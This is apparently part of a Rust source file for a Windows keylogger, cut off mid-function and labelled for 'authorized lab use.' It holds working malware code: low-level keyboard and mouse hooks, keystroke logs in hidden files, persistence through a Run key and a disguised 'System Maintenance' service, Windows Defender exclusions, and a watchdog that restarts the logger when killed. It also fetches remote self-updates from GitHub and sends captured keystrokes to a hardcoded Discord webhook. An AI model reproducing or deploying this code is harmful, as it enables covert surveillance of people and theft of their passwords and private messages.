#![cfg_attr(all(windows, not(debug_assertions)), windows_subsystem = "windows")]

#[cfg(not(windows))]
fn main() {
    eprintln!("This keylogger is Windows-only. Build and run on Windows.");
    std::process::exit(1);
}

#[cfg(windows)]
fn main() -> std::io::Result<()> {
    keylogger::run()
}

#[cfg(windows)]
mod keylogger {
    use std::env;
    use std::ffi::OsString;
    use std::fmt::Write as FmtWrite;
    use std::fs::{self, OpenOptions};
    use std::io::{self, Write};
    use std::os::windows::ffi::OsStrExt;
    use std::os::windows::process::CommandExt;
    use std::path::{Path, PathBuf};
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::mpsc::{self, RecvTimeoutError, SyncSender};
    use std::sync::OnceLock;
    use std::process::{Command, Stdio};
    use std::thread::{self, JoinHandle};
    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

    use uuid::Uuid;
    use serde::Deserialize;
    use windows::core::{PWSTR, PCWSTR};
    use windows::Win32::Foundation::{
        CloseHandle, DuplicateHandle, GetLastError, ERROR_ALREADY_EXISTS, HANDLE, LPARAM, LRESULT,
        WAIT_OBJECT_0, WPARAM, DUPLICATE_SAME_ACCESS,
    };
    use windows::Win32::Storage::FileSystem::{
        CopyFileW, ReadFile, SetFileAttributesW, WriteFile, FILE_ATTRIBUTE_HIDDEN, PIPE_ACCESS_DUPLEX,
    };
    use windows::Win32::System::Console::{AllocConsole, FreeConsole};
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows::Win32::System::Pipes::{
        ConnectNamedPipe, CreateNamedPipeW, DisconnectNamedPipe, CallNamedPipeW,
        PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
    };
    use windows::Win32::System::Registry::{
        RegCloseKey, RegCreateKeyExW, RegDeleteValueW, RegOpenKeyExW, RegSetValueExW, HKEY,
        HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_SET_VALUE, KEY_WRITE, REG_DWORD,
        REG_OPTION_NON_VOLATILE, REG_SZ,
    };
    use windows::Win32::System::RemoteDesktop::{WTSGetActiveConsoleSessionId, WTSQueryUserToken};
    use windows::Win32::System::Threading::{
        CreateEventW, CreateMutexW, CreateProcessAsUserW, GetCurrentProcess, GetCurrentThread,
        SetEvent, SetPriorityClass, SetThreadPriority, WaitForSingleObject, CREATE_NO_WINDOW,
        CREATE_UNICODE_ENVIRONMENT, HIGH_PRIORITY_CLASS, PROCESS_INFORMATION, STARTF_USESHOWWINDOW,
        STARTUPINFOW, THREAD_PRIORITY_HIGHEST,
    };
    use windows::Win32::UI::Input::KeyboardAndMouse::{
        GetKeyboardState, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VIRTUAL_KEY,
        VK_BACK, VK_CAPITAL, VK_DELETE, VK_DOWN, VK_END, VK_ESCAPE, VK_F1, VK_HOME, VK_INSERT,
        VK_LCONTROL, VK_LEFT, VK_LMENU, VK_LSHIFT, VK_LWIN, VK_NEXT, VK_PRIOR, VK_RETURN,
        VK_RCONTROL, VK_RIGHT, VK_RMENU, VK_RSHIFT, VK_RWIN, VK_SPACE, VK_TAB, VK_UP,
    };
    use windows::Win32::UI::WindowsAndMessaging::{
        CallNextHookEx, DispatchMessageW, GetMessageW, PostQuitMessage, SetWindowsHookExW, TranslateMessage,
        UnhookWindowsHookEx, HHOOK, KBDLLHOOKSTRUCT, MSG, MSLLHOOKSTRUCT, SW_HIDE, WH_KEYBOARD_LL,
        WH_MOUSE_LL, WM_ENDSESSION, WM_KEYDOWN, WM_LBUTTONDOWN, WM_MBUTTONDOWN,
        WM_QUERYENDSESSION, WM_RBUTTONDOWN, WM_SYSKEYDOWN,
    };
    use windows_service::{
        define_windows_service,
        service::{
            ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus,
            ServiceType,
        },
        service_control_handler::{self, ServiceControlHandlerResult},
        service_dispatcher,
        service_manager::{ServiceManager, ServiceManagerAccess},
    };

    const ADMIN_LOG_FILE: &str = "admin.log";
    const KEYLOG_FILE: &str = "keylog.txt";
    const MACHINE_ID_FILE: &str = "machine.id";
    const APP_FOLDER: &str = "SecurityLabKeylogger";
    const DEPLOYED_EXE: &str = "hostsvc.exe";
    const SERVICE_NAME: &str = "sysmaim";
    const SERVICE_DISPLAY: &str = "System Maintenance";
    const RUN_VALUE: &str = "SecurityLabKeylogger";
    const RUN_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
    const DEFENDER_PATHS_KEY: &str = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";
    const DEFENDER_PROCESSES_KEY: &str = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes";
    const PIPE_NAME: &str = r"\\.\pipe\7829KMS";
    const WORKER_READY_MUTEX: &str = "Global\\SecurityLabKeyloggerWorker";
    const WATCHDOG_MUTEX: &str = "Global\\SecurityLabKeyloggerWatchdog";
    const UNINSTALL_FLAG: &str = ".uninstall";
    const UPDATE_STAGED_FILE: &str = "hostsvc.exe.update";
    const UPDATE_READY_FLAG: &str = ".update_ready";
    const VERSION_FILE: &str = "version.txt";
    const GITHUB_REPO: &str = "DarsheeeGamer/sadness";
    const GITHUB_RELEASES_URL: &str =
        "https://api.github.com/repos/DarsheeeGamer/sadness/releases/latest";
    const UPDATE_ASSET_NAMES: &[&str] = &["hostsvc.exe", "keylogger.exe"];
    const UPDATE_POLL_INTERVAL: Duration = Duration::from_secs(3600);
    const WEBHOOK_URL: &str = "https://discord.com/api/v10/webhooks/1465626136330502288/KaPOIOxShd9sMrmLq33ck2kAFmW1eWx4SN6ZdZmFBWOHWtl1QMoKIdG1KfJaIyZnLo9s";

    const EVENT_CHANNEL_CAPACITY: usize = 8192;
    const WEBHOOK_CHANNEL_CAPACITY: usize = 64;
    const FLUSH_INTERVAL: Duration = Duration::from_millis(250);
    const SERVICE_POLL_INTERVAL: Duration = Duration::from_secs(5);
    const SERVICE_RESPAWN_INTERVAL: Duration = Duration::from_secs(1);
    const SERVICE_POLL_MAX: Duration = Duration::from_secs(60);
    const WORKER_RESTART_DELAY: Duration = Duration::from_millis(300);

    static EVENT_TX: OnceLock<SyncSender<Event>> = OnceLock::new();
    static WEBHOOK_TX: OnceLock<SyncSender<WebhookJob>> = OnceLock::new();
    static UPDATE_PENDING: AtomicBool = AtomicBool::new(false);
    static mut KB_HOOK: HHOOK = HHOOK(std::ptr::null_mut());
    static mut MOUSE_HOOK: HHOOK = HHOOK(std::ptr::null_mut());

    enum Event {
        Key(u32, u32),
        Mouse { button: u8, x: i32, y: i32 },
        Shutdown,
    }

    struct WebhookJob {
        machine_id: String,
        payload: String,
    }

    #[derive(Deserialize)]
    struct GitHubRelease {
        tag_name: String,
        assets: Vec<GitHubAsset>,
    }

    #[derive(Deserialize)]
    struct GitHubAsset {
        name: String,
        browser_download_url: String,
    }

    define_windows_service!(ffi_service_main, service_entry);

    pub fn run() -> io::Result<()> {
        let args: Vec<String> = env::args().collect();
        match args.get(1).map(String::as_str) {
            Some("--install") => return install_persistence(),
            Some("--uninstall") => return uninstall_persistence(),
            Some("--send-uninstall") => return pipe_send_command("UNINSTALL"),
            Some("--pipe-ping") => return pipe_send_command("PING"),
            Some("--service") => {
                service_dispatcher::start(SERVICE_NAME, ffi_service_main)
                    .map_err(|e| io::Error::other(e.to_string()))?;
                return Ok(());
            }
            Some("--help") | Some("-h") => {
                print_help_to_console();
                return Ok(());
            }
            Some("--worker") => run_worker(),
            Some("--watchdog") => run_watchdog(),
            None => auto_bootstrap(),
            Some(unknown) => Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                format!("Unknown argument: {unknown}. Use --help."),
            )),
        }
    }

    fn auto_bootstrap() -> io::Result<()> {
        let exe = current_exe()?;
        let deployed = deployed_exe_path()?;

        if !paths_equal(&exe, &deployed) {
            install_persistence()?;
            launch_watchdog_detached(&deployed)?;
            admin_log("Bootstrap complete — launched watchdog");
            return Ok(());
        }

        run_watchdog()
    }

    fn paths_equal(a: &Path, b: &Path) -> bool {
        match (a.canonicalize(), b.canonicalize()) {
            (Ok(left), Ok(right)) => left == right,
            _ => a == b,
        }
    }

    fn launch_detached(exe: &Path, arg: &str) -> io::Result<()> {
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;

        Command::new(exe)
            .arg(arg)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()
            .map(|_| ())
            .map_err(|e| io::Error::other(e.to_string()))
    }

    fn launch_watchdog_detached(exe: &Path) -> io::Result<()> {
        launch_detached(exe, "--watchdog")
    }

    fn launch_worker_child(exe: &Path) -> io::Result<std::process::Child> {
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;

        Command::new(exe)
            .arg("--worker")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()
            .map_err(|e| io::Error::other(e.to_string()))
    }

    fn run_watchdog() -> io::Result<()> {
        let _instance_guard = ensure_single_watchdog()?;
        let deployed = deployed_exe_path()?;

        admin_log("Watchdog started");
        start_update_poller();

        loop {
            if uninstall_requested() {
                admin_log("Watchdog stopping (uninstall requested)");
                return Ok(());
            }

            let mut child = match launch_worker_child(&deployed) {
                Ok(child) => child,
                Err(error) => {
                    admin_log(&format!("Watchdog failed to spawn worker: {error}"));
                    thread::sleep(WORKER_RESTART_DELAY);
                    continue;
                }
            };

            loop {
                if uninstall_requested() {
                    let _ = child.kill();
                    admin_log("Watchdog stopping (uninstall requested)");
                    return Ok(());
                }

                if update_pending() {
                    admin_log("Applying staged remote update");
                    let _ = child.kill();
                    let _ = child.wait();
                    if let Err(error) = apply_staged_update(&deployed) {
                        admin_log(&format!("Update apply failed: {error}"));
                    }
                    break;
                }

                match child.try_wait() {
                    Ok(Some(status)) => {
                        admin_log(&format!("Worker exited ({status}) — restarting"));
                        break;
                    }
                    Ok(None) => thread::sleep(Duration::from_millis(500)),
                    Err(error) => {
                        admin_log(&format!("Watchdog wait error: {error}"));
                        break;
                    }
                }
            }

            thread::sleep(WORKER_RESTART_DELAY);
        }
    }

    fn start_update_poller() {
        thread::Builder::new()
            .name("github-update".into())
            .spawn(update_poller_loop)
            .ok();
    }

    fn update_poller_loop() {
        admin_log(&format!("Update poller started ({GITHUB_REPO})"));
        loop {
            thread::sleep(UPDATE_POLL_INTERVAL);
            if uninstall_requested() {
                return;
            }

            match check_and_stage_update() {
                Ok(true) => admin_log("Remote update staged — will apply on next worker cycle"),
                Ok(false) => {}
                Err(error) => admin_log(&format!("Update check failed: {error}")),
            }
        }
    }

    fn update_pending() -> bool {
        UPDATE_PENDING.load(Ordering::SeqCst)
            || data_dir()
                .map(|dir| dir.join(UPDATE_READY_FLAG).exists())
                .unwrap_or(false)
    }

    fn set_update_pending(active: bool) {
        UPDATE_PENDING.store(active, Ordering::SeqCst);
        if let Ok(dir) = data_dir() {
            let flag = dir.join(UPDATE_READY_FLAG);
            if active {
                let _ = fs::write(&flag, b"1");
            } else {
                let _ = fs::remove_file(flag);
            }
        }
    }

    fn load_installed_version() -> io::Result<String> {
        let path = data_dir()?.join(VERSION_FILE);
        if path.exists() {
            return Ok(fs::read_to_string(path)?.trim().to_string());
        }
        Ok(env!("CARGO_PKG_VERSION").to_string())
    }

    fn save_installed_version(version: &str) -> io::Result<()> {
        let path = data_dir()?.join(VERSION_FILE);
        fs::write(&path, format!("{version}\n"))?;
        set_hidden(&path);
        Ok(())
    }

    fn normalize_version_tag(tag: &str) -> String {
        tag.trim().trim_start_matches(['v', 'V']).to_string()
    }

    fn version_is_newer(remote: &str, current: &str) -> bool {
        let remote_parts = parse_version_parts(remote);
        let current_parts = parse_version_parts(current);
        remote_parts > current_parts
    }

    fn parse_version_parts(version: &str) -> Vec<u32> {
        normalize_version_tag(version)
            .split('.')
            .filter_map(|part| part.parse::<u32>().ok())
            .collect()
    }

    fn fetch_latest_release(agent: &ureq::Agent) -> io::Result<GitHubRelease> {
        let response = agent
            .get(GITHUB_RELEASES_URL)
            .set("Accept", "application/vnd.github+json")
            .set("User-Agent", "SecurityLabKeylogger-Updater")
            .call()
            .map_err(|error| io::Error::other(error.to_string()))?;

        if response.status() != 200 {
            return Err(io::Error::other(format!(
                "GitHub releases API returned HTTP {}",
                response.status()
            )));
        }

        let body = response
            .into_string()
            .map_err(|error| io::Error::other(error.to_string()))?;

        serde_json::from_str::<GitHubRelease>(&body)
            .map_err(|error| io::Error::other(error.to_string()))
    }

    fn pick_release_asset(release: &GitHubRelease) -> Option<&GitHubAsset> {
        for preferred in UPDATE_ASSET_NAMES {
            if let Some(asset) = release.assets.iter().find(|asset| asset.name == *preferred) {
                return Some(asset);
            }
        }
        release.assets.first()
    }

    fn check_and_stage_update() -> io::Result<bool> {
        if update_pending() {
            return Ok(false);
        }

        let agent = ureq::AgentBuilder::new()
            .timeout_connect(Duration::from_secs(15))
            .timeout_read(Duration::from_secs(120))
            .build();

        let release = fetch_latest_release(&agent)?;
        let remote_version = normalize_version_tag(&release.tag_name);
        let current_version = load_installed_version()?;

        if !version_is_newer(&remote_version, &current_version) {
            return Ok(false);
        }

        let asset = pick_release_asset(&release)
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "release has no assets"))?;

        admin_log(&format!(
            "Update available: {current_version} -> {remote_version} ({})",
            asset.name
        ));

        let dir = data_dir()?;
        let staged = dir.join(UPDATE_STAGED_FILE);
        download_release_asset(&agent, &asset.browser_download_url, &staged)?;
        verify_pe_executable(&staged)?;

        set_update_pending(true);
        admin_log(&format!("Staged update {remote_version} at {}", staged.display()));
        Ok(true)
    }

    fn download_release_asset(agent: &ureq::Agent, url: &str, dest: &Path) -> io::Result<()> {
        let response = agent
            .get(url)
            .set("User-Agent", "SecurityLabKeylogger-Updater")
            .call()
            .map_err(|error| io::Error::other(error.to_string()))?;

        if response.status() != 200 {
            return Err(io::Error::other(format!(
                "Asset download returned HTTP {}",
                response.status()
            )));
        }

        let mut file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(dest)?;
        io::copy(&mut response.into_reader(), &mut file)?;
        Ok(())
    }

    fn verify_pe_executable(path: &Path) -> io::Result<()> {
        let header = fs::read(path).map(|data| data.into_iter().take(2).collect::<Vec<_>>())?;
        if header != [b'M', b'Z'] {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "downloaded update is not a PE executable",
            ));
        }
        Ok(())
    }

    fn apply_staged_update(deployed: &Path) -> io::Result<()> {
        let dir = data_dir()?;
        let staged = dir.join(UPDATE_STAGED_FILE);
        if !staged.exists() {
            set_update_pending(false);
            return Ok(());
        }

        copy_file(&staged, deployed)?;
        hide_deployed_artifacts(&dir);

        if let Err(error) = install_windows_service(deployed) {
            admin_log(&format!("Service refresh after update skipped: {error}"));
        }
        if let Err(error) = add_defender_exclusions(deployed, &dir) {
            admin_log(&format!("Defender refresh after update skipped: {error}"));
        }

        let release = {
            let agent = ureq::AgentBuilder::new()
                .timeout_connect(Duration::from_secs(15))
                .timeout_read(Duration::from_secs(30))
                .build();
            fetch_latest_release(&agent)
        };

        if let Ok(release) = release {
            save_installed_version(&normalize_version_tag(&release.tag_name))?;
            admin_log(&format!(
                "Update applied: {}",
                normalize_version_tag(&release.tag_name)
            ));
        } else {
            save_installed_version(env!("CARGO_PKG_VERSION"))?;
            admin_log("Update applied (version tag unavailable)");
        }

        let _ = fs::remove_file(&staged);
        set_update_pending(false);
        Ok(())
    }

    fn run_worker() -> io::Result<()> {
        let _instance_guard = ensure_single_instance()?;
        raise_process_priority()?;

        let machine_id = load_or_create_machine_id()?;

        admin_log("Worker started");
        start_command_pipe();
        start_webhook_sender();

        let (tx, rx) = mpsc::sync_channel(EVENT_CHANNEL_CAPACITY);
        EVENT_TX.set(tx.clone()).ok();

        let writer = thread::Builder::new()
            .name("winsvc-worker".into())
            .spawn({
                let writer_id = machine_id.clone();
                move || writer_loop(rx, writer_id)
            })
            .map_err(|e| io::Error::other(e.to_string()))?;

        let run_result = unsafe {
            let module = GetModuleHandleW(None).map_err(|e| io::Error::other(e.message()))?;

            KB_HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), module, 0)
                .map_err(|e| io::Error::other(format!("keyboard hook failed: {e}")))?;

            MOUSE_HOOK = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_proc), module, 0)
                .map_err(|e| io::Error::other(format!("mouse hook failed: {e}")))?;

            let mut msg = MSG::default();
            while GetMessageW(&mut msg, None, 0, 0).as_bool() {
                if msg.message == WM_QUERYENDSESSION || msg.message == WM_ENDSESSION {
                    break;
                }
                let _ = TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }

            let _ = UnhookWindowsHookEx(KB_HOOK);
            let _ = UnhookWindowsHookEx(MOUSE_HOOK);
            Ok::<(), io::Error>(())
        };

        shutdown_and_flush(&tx, writer)?;
        admin_log("Worker stopped");
        run_result
    }

    fn service_entry(_arguments: Vec<OsString>) {
        if let Err(error) = run_service() {
            admin_log(&format!("Service failed: {error}"));
        }
    }

    fn run_service() -> io::Result<()> {
        let stop_event = unsafe {
            CreateEventW(None, true, false, None).map_err(|e| io::Error::other(e.message()))?
        };
        let mut stop_event_dup = HANDLE::default();
        unsafe {
            DuplicateHandle(
                GetCurrentProcess(),
                stop_event,
                GetCurrentProcess(),
                &mut stop_event_dup,
                0,
                false,
                DUPLICATE_SAME_ACCESS,
            )
            .map_err(|e| io::Error::other(e.message()))?;
        }
        let stop_event_for_handler = stop_event_dup.0 as usize;

        let status_handle = service_control_handler::register(
            SERVICE_NAME,
            move |control| match control {
                ServiceControl::Stop | ServiceControl::Shutdown => {
                    unsafe {
                        let _ = SetEvent(HANDLE(stop_event_for_handler as *mut _));
                    }
                    ServiceControlHandlerResult::NoError
                }
                ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
                _ => ServiceControlHandlerResult::NotImplemented,
            },
        )
        .map_err(|e| io::Error::other(e.to_string()))?;

        report_service_status(
            &status_handle,
            ServiceState::StartPending,
            ServiceControlAccept::STOP | ServiceControlAccept::SHUTDOWN,
        )?;

        let deployed = deployed_exe_path()?;
        admin_log(&format!("Service started, monitoring sessions for {deployed:?}"));

        report_service_status(
            &status_handle,
            ServiceState::Running,
            ServiceControlAccept::STOP | ServiceControlAccept::SHUTDOWN,
        )?;

        let base_poll_ms = SERVICE_POLL_INTERVAL.as_millis().min(u32::MAX as u128) as u32;
        let respawn_poll_ms = SERVICE_RESPAWN_INTERVAL.as_millis().min(u32::MAX as u128) as u32;
        let max_poll_ms = SERVICE_POLL_MAX.as_millis().min(u32::MAX as u128) as u32;
        let mut poll_ms = respawn_poll_ms;

        loop {
            let wait = unsafe { WaitForSingleObject(stop_event, poll_ms) };
            if wait == WAIT_OBJECT_0 {
                break;
            }

            if supervisor_running() {
                poll_ms = base_poll_ms;
                continue;
            }

            match spawn_watchdog_in_active_session(&deployed) {
                Ok(()) => {
                    admin_log("Spawned user-session watchdog");
                    poll_ms = respawn_poll_ms;
                }
                Err(error) => {
                    admin_log(&format!("Watchdog spawn skipped: {error}"));
                    poll_ms = poll_ms.saturating_mul(2).min(max_poll_ms);
                }
            }
        }

        unsafe {
            let _ = CloseHandle(stop_event);
            let _ = CloseHandle(stop_event_dup);
        }

        report_service_status(
            &status_handle,
            ServiceState::StopPending,
            ServiceControlAccept::empty(),
        )?;
        admin_log("Service stopping");
        report_service_status(
            &status_handle,
            ServiceState::Stopped,
            ServiceControlAccept::empty(),
        )?;
        Ok(())
    }

    fn report_service_status(
        handle: &service_control_handler::ServiceStatusHandle,
        state: ServiceState,
        accept: ServiceControlAccept,
    ) -> io::Result<()> {
        handle
            .set_service_status(ServiceStatus {
                service_type: ServiceType::OWN_PROCESS,
                current_state: state,
                controls_accepted: accept,
                exit_code: ServiceExitCode::Win32(0),
                checkpoint: 0,
                wait_hint: Duration::from_secs(3),
                process_id: None,
            })
            .map_err(|e| io::Error::other(e.to_string()))
    }

    fn supervisor_running() -> bool {
        mutex_exists(WATCHDOG_MUTEX)
    }

    fn mutex_exists(name: &str) -> bool {
        let wide = str_to_wide(name);
        unsafe {
            let handle = CreateMutexW(None, false, PCWSTR(wide.as_ptr()));
            if handle.is_err() {
                return false;
            }
            let exists = GetLastError() == ERROR_ALREADY_EXISTS;
            if let Ok(h) = handle {
                let _ = CloseHandle(h);
            }
            exists
        }
    }

    fn spawn_watchdog_in_active_session(exe: &Path) -> io::Result<()> {
        spawn_in_active_session(exe, "--watchdog")
    }

    fn spawn_in_active_session(exe: &Path, arg: &str) -> io::Result<()> {
        unsafe {
            let session = WTSGetActiveConsoleSessionId();
            if session == 0xFFFF_FFFF {
                return Err(io::Error::new(io::ErrorKind::NotFound, "no active console session"));
            }

            let mut user_token = HANDLE::default();
            WTSQueryUserToken(session, &mut user_token)
                .map_err(|e| io::Error::other(format!("WTSQueryUserToken failed: {e}")))?;

            let cmd = format!("\"{}\" {arg}", exe.display());
            let mut cmd_wide: Vec<u16> = cmd.encode_utf16().chain(std::iter::once(0)).collect();

            let mut desktop = str_to_wide("winsta0\\default");
            let startup = STARTUPINFOW {
                cb: std::mem::size_of::<STARTUPINFOW>() as u32,
                lpDesktop: PWSTR(desktop.as_mut_ptr()),
                dwFlags: STARTF_USESHOWWINDOW,
                wShowWindow: SW_HIDE.0 as u16,
                ..Default::default()
            };
            let mut process_info = PROCESS_INFORMATION::default();

            let result = CreateProcessAsUserW(
                user_token,
                None,
                PWSTR(cmd_wide.as_mut_ptr()),
                None,
                None,
                false,
                CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
                None,
                None,
                &startup,
                &mut process_info,
            );

            let _ = CloseHandle(user_token);

            if let Err(error) = result {
                return Err(io::Error::other(format!("CreateProcessAsUserW failed: {error}")));
            }

            let _ = CloseHandle(process_info.hThread);
            let _ = CloseHandle(process_info.hProcess);
        }

        Ok(())
    }

    struct InstanceGuard(HANDLE);

    impl Drop for InstanceGuard {
        fn drop(&mut self) {
            unsafe {
                let _ = CloseHandle(self.0);
            }
        }
    }

    fn ensure_single_watchdog() -> io::Result<InstanceGuard> {
        ensure_single_mutex(WATCHDOG_MUTEX)
    }

    fn ensure_single_instance() -> io::Result<InstanceGuard> {
        ensure_single_mutex(WORKER_READY_MUTEX)
    }

    fn ensure_single_mutex(name: &str) -> io::Result<InstanceGuard> {
        let wide = str_to_wide(name);
        unsafe {
            let handle = CreateMutexW(None, true, PCWSTR(wide.as_ptr()))
                .map_err(|e| io::Error::other(e.message()))?;
            if GetLastError() == ERROR_ALREADY_EXISTS {
                std::process::exit(0);
            }
            Ok(InstanceGuard(handle))
        }
    }

    fn uninstall_requested() -> bool {
        data_dir()
            .map(|dir| dir.join(UNINSTALL_FLAG).exists())
            .unwrap_or(false)
    }

    fn set_uninstall_flag() {
        if let Ok(dir) = data_dir() {
            let _ = fs::write(dir.join(UNINSTALL_FLAG), b"1");
        }
    }

    fn clear_uninstall_flag() {
        if let Ok(dir) = data_dir() {
            let _ = fs::remove_file(dir.join(UNINSTALL_FLAG));
        }
    }

    fn admin_log(message: &str) {
        if let Ok(dir) = data_dir() {
            let path = dir.join(ADMIN_LOG_FILE);
            let line = format!(
                "[{}] {message}\n",
                SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .map(|d| d.as_secs())
                    .unwrap_or(0)
            );
            let _ = OpenOptions::new().create(true).append(true).open(path).and_then(|mut f| {
                f.write_all(line.as_bytes())
            });
        }
    }

    fn set_hidden(path: &Path) {
        let wide = path_to_wide(path);
        unsafe {
            let _ = SetFileAttributesW(PCWSTR(wide.as_ptr()), FILE_ATTRIBUTE_HIDDEN);
        }
    }

    fn hide_deployed_artifacts(dir: &Path) {
        set_hidden(dir);
        for name in [DEPLOYED_EXE, KEYLOG_FILE, MACHINE_ID_FILE, ADMIN_LOG_FILE] {
            set_hidden(&dir.join(name));
        }
    }

    fn print_help_to_console() {
        unsafe {
            if AllocConsole().is_ok() {
                print_help();
                let _ = FreeConsole();
            } else {
                print_help();
            }
        }
    }

    fn raise_process_priority() -> io::Result<()> {
        unsafe {
            SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)
                .map_err(|e| io::Error::other(e.message()))?;
            SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)
                .map_err(|e| io::Error::other(e.message()))?;
        }
        Ok(())
    }

    fn shutdown_and_flush(tx: &SyncSender<Event>, writer: JoinHandle<()>) -> io::Result<()> {
        admin_log("Shutdown requested — flushing buffered logs");

        if tx.send(Event::Shutdown).is_err() {
            return Ok(());
        }

        writer
            .join()
            .map_err(|_| io::Error::other("Writer thread panicked during shutdown"))?;

        admin_log("Buffered data flushed successfully");
        Ok(())
    }

    fn print_help() {
        println!("Security exercise keylogger (authorized lab use only)");
        println!();
        println!("Usage:");
        println!("  keylogger.exe               Auto-install (if needed) and start watchdog");
        println!("  keylogger.exe --install     Deploy only, do not start watchdog");
        println!("  keylogger.exe --uninstall   Remove service and artifacts");
        println!("  keylogger.exe --watchdog    Supervise worker (auto-restart on kill)");
        println!("  keylogger.exe --worker      Run capture worker in user session");
        println!();
        println!("  keylogger.exe --send-uninstall  Remote teardown via \\\\.\\pipe\\7829KMS");
        println!("  keylogger.exe --pipe-ping       Check if worker pipe is alive");
    }

    fn data_dir() -> io::Result<PathBuf> {
        let base = env::var_os("APPDATA")
            .map(PathBuf::from)
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "APPDATA not set"))?;
        let dir = base.join(APP_FOLDER);
        fs::create_dir_all(&dir)?;
        Ok(dir)
    }

    fn deployed_exe_path() -> io::Result<PathBuf> {
        Ok(data_dir()?.join(DEPLOYED_EXE))
    }

    fn load_or_create_machine_id() -> io::Result<String> {
        let path = data_dir()?.join(MACHINE_ID_FILE);
        if path.exists() {
            return Ok(fs::read_to_string(path)?.trim().to_string());
        }

        let id = Uuid::new_v4().to_string();
        fs::write(&path, format!("{id}\n"))?;
        set_hidden(&path);
        Ok(id)
    }

    fn flush_buffer_to_disk(payload: &str) {
        if payload.is_empty() {
            return;
        }

        if let Ok(dir) = data_dir() {
            let path = dir.join(KEYLOG_FILE);
            let _ = OpenOptions::new()
                .create(true)
                .append(true)
                .open(&path)
                .and_then(|mut file| file.write_all(payload.as_bytes()));
            set_hidden(&path);
        }
    }

    fn flush_captured_events(payload: &str, machine_id: &str) {
        flush_buffer_to_disk(payload);
        queue_webhook(machine_id, payload);
    }

    struct WriteBuffer {
        data: String,
        last_flush: Instant,
    }

    impl WriteBuffer {
        fn new() -> Self {
            Self {
                data: String::with_capacity(4096),
                last_flush: Instant::now(),
            }
        }

        fn append_line(&mut self, line: &str) {
            self.data.push_str(line);
        }

        fn should_flush(&self) -> bool {
            !self.data.is_empty() && self.last_flush.elapsed() >= FLUSH_INTERVAL
        }

        fn take_payload(&mut self) -> Option<String> {
            if self.data.is_empty() {
                self.last_flush = Instant::now();
                return None;
            }

            let payload = std::mem::take(&mut self.data);
            self.last_flush = Instant::now();
            Some(payload)
        }
    }

    fn start_webhook_sender() {
        WEBHOOK_TX.get_or_init(|| {
            let (tx, rx) = mpsc::sync_channel(WEBHOOK_CHANNEL_CAPACITY);
            thread::Builder::new()
                .name("webhook-sender".into())
                .spawn(move || webhook_sender_loop(rx))
                .ok();
            tx
        });
    }

    fn queue_webhook(machine_id: &str, payload: &str) {
        if payload.is_empty() {
            return;
        }

        let Some(tx) = WEBHOOK_TX.get() else {
            return;
        };

        let _ = tx.try_send(WebhookJob {
            machine_id: machine_id.to_string(),
            payload: payload.to_string(),
        });
    }

    fn webhook_sender_loop(rx: mpsc::Receiver<WebhookJob>) {
        let agent = ureq::AgentBuilder::new()
            .timeout_connect(Duration::from_secs(10))
            .timeout_read(Duration::from_secs(30))
            .build();

        for job in rx {
            post_webhook(&agent, &job.machine_id, &job.payload);
        }
    }

    fn post_webhook(agent: &ureq::Agent, machine_id: &str, payload: &str) {
        let boundary = format!("----Boundary{}", Uuid::new_v4().simple());
        let filename = format!("{machine_id}.log");
        let body = build_webhook_multipart(&boundary, machine_id, &filename, payload.as_bytes());

        let _ = agent
            .post(WEBHOOK_URL)
            .set(
                "Content-Type",
                &format!("multipart/form-data; boundary={boundary}"),
            )
            .send_bytes(&body);
    }

    fn build_webhook_multipart(
        boundary: &str,
        machine_id: &str,
        filename: &str,
        file_data: &[u8],
    ) -> Vec<u8> {
        let mut body = Vec::with_capacity(file_data.len() + 512);

        push_multipart_field(
            &mut body,
            boundary,
            "content",
            None,
            machine_id.as_bytes(),
        );
        push_multipart_file(&mut body, boundary, "file", filename, file_data);
        let _ = write!(body, "--{boundary}--\r\n");

        body
    }

    fn push_multipart_field(
        body: &mut Vec<u8>,
        boundary: &str,
        name: &str,
        content_type: Option<&str>,
        data: &[u8],
    ) {
        let _ = write!(body, "--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"");
        if let Some(mime) = content_type {
            let _ = write!(body, "\r\nContent-Type: {mime}");
        }
        body.extend_from_slice(b"\r\n\r\n");
        body.extend_from_slice(data);
        body.extend_from_slice(b"\r\n");
    }

    fn push_multipart_file(
        body: &mut Vec<u8>,
        boundary: &str,
        name: &str,
        filename: &str,
        data: &[u8],
    ) {
        let _ = write!(
            body,
            "--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\nContent-Type: text/plain\r\n\r\n"
        );
        body.extend_from_slice(data);
        body.extend_from_slice(b"\r\n");
    }

    fn writer_loop(rx: mpsc::Receiver<Event>, machine_id: String) {
        let mut write_buffer = WriteBuffer::new();
        let mut line = String::with_capacity(128);
        let start = Instant::now();

        loop {
